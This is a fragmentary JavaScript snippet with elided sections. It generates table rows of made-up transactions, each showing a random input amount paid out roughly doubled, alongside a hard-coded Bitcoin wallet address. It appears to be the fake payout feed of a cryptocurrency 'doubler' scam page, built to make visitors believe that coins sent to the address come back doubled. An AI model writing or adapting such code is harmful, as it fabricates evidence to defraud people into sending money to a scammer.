$(function () {
    const BaseWallet = "19iqYbeATe4RxghQZJnYVFU4mjUUu76EA6";

    function createTableItem() {
        let inputValue = randomInteger(0.01,0.10) + "." + randomString(2, "123456789");
        let outputValue = ++inputValue * 2;
        let txFIn = inputValue / 10000;
        let txFOut = outputValue / 10000;
            ...
            <div class="table-row">
                ...
                <div class="table-row_content">
                    <div class="table-row_line">
                        ...
                        <p class="txfee">${txFOut.toFixed(4)}</p>
                    </div>
                    <hr class="table-row_hr">
                    <div class="table-row_line">
                        <p class="address">${cutWallet}</p>
                        ...
                        <p class="txfee">${txFIn.toFixed(4)}</p>
                    </div>
                </div>
            </div>`;
